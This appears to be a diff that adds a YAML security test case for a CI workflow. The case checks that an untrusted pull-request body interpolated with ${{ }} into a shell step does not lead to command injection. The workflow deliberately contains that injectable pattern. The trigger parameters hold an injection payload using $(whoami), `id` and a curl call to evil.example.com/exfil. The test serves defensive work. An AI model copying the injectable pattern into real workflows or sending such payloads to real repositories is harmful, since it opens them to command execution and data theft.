@@ -1,0 +1,59 @@
+id: SEC-INJECT-03-002
+dimensions: [security]
+dimension: security
+priority: P0
+title: "PR 正文中的不可信输入不应通过 ${{ }} 直接插入 run 导致命令注入"
+intent_ref: INTENT-SEC-010
+
+setup:
+  repo_fixture: with-fork-and-pr-template
+  secrets: []
+  variables: {}
+  branch_protection: default
+
+workflow: |
+  on: [pull_request]
+  permissions: {}
+  jobs:
+    body-check:
+      name: (SEC-INJECT-03-002) 验证 PR 正文注入防护
+      runs-on: [ubuntu-latest, x64, small]
+      steps:
+        - name: (SEC-INJECT-03-002) 检出代码
+          uses: checkout
+        - name: (SEC-INJECT-03-002) 引用 PR 正文
+          run: |
+            echo "BODY_START"
+            echo "${{ atomgit.event.pull_request.body }}"
+            echo "BODY_END"
+            echo "INJECTION_DEFENDED: yes"
+        - name: (SEC-INJECT-03-002) 检查注入副作用
+          if: ${{ always() }}
+          run: |
+            if [ -f /tmp/exfil_inject ]; then
+              echo "INJECTION_OCCURRED: yes"
+              exit 1
+            else
+              echo "INJECTION_OCCURRED: no"
+            fi
+
+trigger:
+  event: pull_request
+  as: untrusted_contributor
+  params:
+    pr_body_multiline: "$(whoami)\n`id`\n; curl -s http://evil.example.com/exfil"
+
+fault_injection: null
+
+assertions:
+  - type: negative
+    target: step_logs
+    eval: deterministic
+    rubric: "INJECTION_DEFENDED 显示 yes，INJECTION_OCCURRED 显示 no"
+  - type: negative
+    target: run_status
+    eval: deterministic
+    rubric: "workflow 不应因注入命令执行而产生非预期行为"
+
+teardown:
+  reset: fixture
